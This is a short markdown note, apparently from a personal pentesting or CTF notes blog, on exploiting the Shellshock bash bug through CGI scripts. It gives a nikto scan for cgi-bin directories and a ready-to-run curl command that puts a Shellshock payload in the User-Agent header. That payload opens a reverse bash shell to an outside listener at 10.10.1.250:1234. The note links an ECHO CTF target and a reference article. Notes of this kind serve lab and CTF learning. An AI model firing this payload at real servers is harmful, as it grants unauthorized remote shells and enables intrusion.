---
description: >-
  Shellshock
title: Shellshock              # Add title here
date: 2022-08-12 08:00:00 -0600                           # Change the date to match completion date
categories: [06 Exploitation, Shellshock]                     # Change Templates to Writeup
tags: [exploitation, rce, shellshock]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### User-Agent
First you need to find a cgi-bin directory, for this task the best tool is nikto:
```bash
nikto -h <IP>
```

Next with curl we can abuse of the legacy version of outdated bash which accepts some payloads:
```bash
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.1.250/1234 0>&1" http://10.0.30.121/cgi-bin/uptime
```
Examples:
[ECHO CTF legacy](https://echoctf.red/target/35)

### References
[cgi-bin Exploitation](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)